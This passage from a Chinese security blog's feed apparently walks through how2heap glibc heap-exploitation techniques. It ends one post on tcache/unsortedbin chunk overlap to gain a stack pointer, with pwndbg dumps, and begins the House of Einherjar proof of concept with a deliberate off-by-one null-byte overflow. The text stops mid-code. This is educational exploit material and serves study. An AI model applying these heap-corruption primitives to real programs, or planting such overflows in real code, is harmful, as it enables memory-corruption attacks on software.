src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620958000950-cc8ec18b-d83f-4b4e-896c-ca3ea835f828.png#clientId=u8e7e6c94-2c24-4&from=drop&id=ucc2009b6&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2010.06.35.png&originHeight=678&originWidth=2752&originalType=binary&size=87329&status=done&style=none&taskId=u0bc0e5a0-1a17-43b8-b5dd-b59eb22b06a" alt="截屏2021-05-14 10.06.35.png"><br>unlink 后会对那个堆块进行切割并设置 last_remainder；<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620958178055-523a0cf1-1bb4-485d-b376-233b9337387c.png#clientId=u8e7e6c94-2c24-4&from=drop&id=u79a38044&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2010.09.32.png&originHeight=750&originWidth=2746&originalType=binary&size=107437&status=done&style=none&taskId=u78191051-a5f1-4ce9-a76a-ce83584adf9" alt="截屏2021-05-14 10.09.32.png"><br>现在的内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">400</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757ae0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000131</span> #chunk_prev(<span class="built_in">malloc</span>)-------------</span><br><span class="line">       #<span class="number">0x0000000000000221</span>  ｜</span><br><span class="line"><span class="number">0x5555557579d0</span>:<span class="number">0x00007ffff7dcdeb0</span><span class="number">0x00007ffff7dcdeb0</span>                  |</span><br><span class="line">    <span class="meta">#changed#changed  |</span></span><br><span class="line">......chunk_prev范围 ----|</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-tcachebin)  |</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000555555757010</span>     ｜</span><br><span class="line"><span class="number">0x555555757af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000f1</span> #unsortedbin_chunk--------------|</span><br><span class="line"><span class="number">0x555555757b00</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757be0</span>:<span class="number">0x00000000000000f0</span><span class="number">0x0000000000000020</span> <span class="meta">#chunk(avoid top chunk)</span></span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x555555757bf0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757c00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020401</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>程序返回之后会继续执行如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br></pre></td></tr></table></figure><p>由于现在堆块 chunk_prev 处于 malloc 状态的，也就是说其 user_data 可写，并且这个堆块是包含处于 free 状态下 chunk_victim，现在我们可以通过 chunk_prev 来修改 chunk_victim 的内容，这里修改 tcache 的 next 指针，让其指向 stack 上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">400</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757ae0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk0(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk1(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk2(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk3(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk4(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk5(<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk6(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000131</span> #chunk_prev(<span class="built_in">malloc</span>)-------------</span><br><span class="line">......                  |</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-tcachebin)  |</span><br><span class="line"><span class="number">0x555555757ae0</span>:<span class="number">0x00007fffffffdd80</span><span class="number">0x0000555555757010</span>     ｜</span><br><span class="line">   #<span class="number">0x00005555557577b0</span>  |</span><br><span class="line"><span class="number">0x555555757af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000f1</span> #unsortedbin_chunk-------------|</span><br><span class="line"><span class="number">0x555555757b00</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757be0</span>:<span class="number">0x00000000000000f0</span><span class="number">0x0000000000000020</span> <span class="meta">#chunk(avoid top chunk)</span></span><br><span class="line"><span class="number">0x555555757bf0</span>: <span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757c00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020401</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>因为我问修改的是最后插入 tcachebin 的 free chunk 的 next 指针，因此原来的 tcachebin 链表已不存在：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620960241267-a6c1f7d9-f929-4de0-a43e-ee9e8f254fb0.png#clientId=u8e7e6c94-2c24-4&from=drop&id=u87a730b8&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2010.43.56.png&originHeight=668&originWidth=2750&originalType=binary&size=93615&status=done&style=none&taskId=u345047c3-d6a7-4bb8-bf3f-32ffee24202" alt="截屏2021-05-14 10.43.56.png"><br>当我们再次 malloc 两次时会控制栈上的地址（tcache_get 中没有任何的安全性检查，所以这里很顺利 😂）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// take target out</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(c==stack_var);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620960947062-873ad751-e9f2-4619-b031-ff579d4daac1.png#clientId=u8e7e6c94-2c24-4&from=drop&id=uf4788c52&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2010.55.41.png&originHeight=676&originWidth=2750&originalType=binary&size=88919&status=done&style=none&taskId=uf12b00a1-7694-4c85-a4de-c325ff14c25" alt="截屏2021-05-14 10.55.41.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620978821413-9014ea05-06e2-4d6c-ad60-152a7525d6c1.png#clientId=u890607f1-c558-4&from=drop&id=u4b71a8f4&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2015.53.36.png&originHeight=1246&originWidth=2752&originalType=binary&size=268853&status=done&style=none&taskId=u13918602-9736-4d8e-be15-0398ba10327" alt="截屏2021-05-14 15.53.36.png"></p><h1 id="漏洞利用（POC-总结）"><a href="#漏洞利用（POC-总结）" class="headerlink" title="漏洞利用（POC 总结）"></a>漏洞利用（POC 总结）</h1><ol><li>首先 malloc 7 个大小在 tcachebin 中的堆块，然后再次 malloc 相同两个大小的堆块：chunk_prev 和 chunk_victim。</li><li>然后 free 申请的前 7 个堆块让其进入到 tcachebin 中，填满 tcachebin</li><li>然后我们 free 掉 chunk_victim 堆块，让其进入到 unsortedbin 中</li><li>之后 free chunk_prev，此时堆块发生向前合并，chunk_prev 会和之前释放的 chunk_victim 进行合并</li><li>我们再次 malloc 与之前相同大小的堆块，此次申请会使用 tcachebin 中的 free chunk，现在 tcachebin 中剩余 6 个 free chunk，然后我们再次 free chunk_victim 让其进入到 tcachebin 中。</li><li>然后申请比之前 malloc 稍微大一点的堆块，这个堆块会对之前合并的 unsortedbin 进行切割，切割完成后 chunk_victim 的 next 指针已经可控</li><li>修改 chunk_victim 的 next 指针到 target（目标地址），再次 malloc 两次之后即可控制。<blockquote><p><strong>核心思想：让 chunk_victim 即处于 tcachebin 又处于 unsortedbin 中</strong></p></blockquote></li></ol><h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>我可以把 POC 中的 step3 和 step4 颠倒吗？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>当然可以，因为这两个堆块时相邻的，无论 free 这两个堆块顺序是怎样的，两个堆块 free 之后都会发生向前合并或向后合并，因此这对这种攻击方式不会产生任何影响：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620978861714-fa598647-3932-4938-a44a-894b122c9914.png#clientId=u890607f1-c558-4&from=paste&height=624&id=u2a8244de&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1248&originWidth=2748&originalType=binary&size=265757&status=done&style=none&taskId=ub2671b2f-75c1-4a71-ba18-f0142931608&width=1374" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(10)-house of einherjar</title>
    <link href="https://cyberangel.cn/2021/05/12/how2heap(10)-house%20of%20einherjar/"/>
    <id>https://cyberangel.cn/2021/05/12/how2heap(10)-house%20of%20einherjar/</id>
    <published>2021-05-12T08:48:09.000Z</published>
    <updated>2021-07-04T09:57:11.952Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一小节我们来看 house of einherjar 这种攻击方式。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-代码"><a href="#POC-代码" class="headerlink" title="POC 代码"></a>POC 代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 18.04.4 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of</span></span><br><span class="line"><span class="comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x4f8</span>);</span><br><span class="line"><span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x4f8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"><span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x500) | prev_inuse = 0x501\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br><span class="line">a[real_a_size] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* VULNERABILITY */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, 